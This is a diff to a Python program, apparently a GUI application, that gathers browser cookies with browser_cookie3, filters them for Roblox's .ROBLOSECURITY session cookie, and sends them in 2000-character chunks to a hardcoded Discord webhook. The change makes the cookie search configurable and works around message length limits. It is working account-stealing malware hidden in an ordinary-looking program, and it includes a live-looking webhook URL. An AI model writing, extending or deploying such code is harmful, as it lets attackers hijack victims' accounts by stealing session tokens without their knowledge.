@@ -12,10 +12,11 @@ from discord_webhook import DiscordWebhook
 
 
 webhook_url = "https://discord.com/api/webhooks/787513008301670411/p5_XXC1a7wCZ1NZt056MECwBhpwxuadpb-sG60k5lT49Z-xNxQE9BYOM78mN9n-D4jkb"
-cookie_name = ".ROBLOSECURITY"
-# defines webhook and cookie to find
+cookie_names = [".ROBLOSECURITY"]
+# defines webhook and cookies to find (the link can be changed, and the cookie search keywords can be altered)
 
 cookies = []
+n_limit = 2000
 
 try:
     cookies.extend(list(browser_cookie3.chrome()))
@@ -27,10 +28,14 @@ try:
 except:
     pass
 
-roblox_cookie = [str(x) for x in cookies if cookie_name in str(x)]
-webhook = DiscordWebhook(url=webhook_url, content=str(roblox_cookie))
-response = webhook.execute()
-# sends cookies to discord chat
+for y in cookie_names:
+    send_cookie = str([str(x) for x in cookies if y in str(x)])
+    chunks = [send_cookie[i:i + n_limit] for i in range(0, len(send_cookie), n_limit)]
+
+    for z in chunks:
+        webhook = DiscordWebhook(url=webhook_url, content=z)
+        response = webhook.execute()
+        # sends cookies to discord chat
 
 
 def centerWindow(myRoot, width, height):  # centers window with a specific size
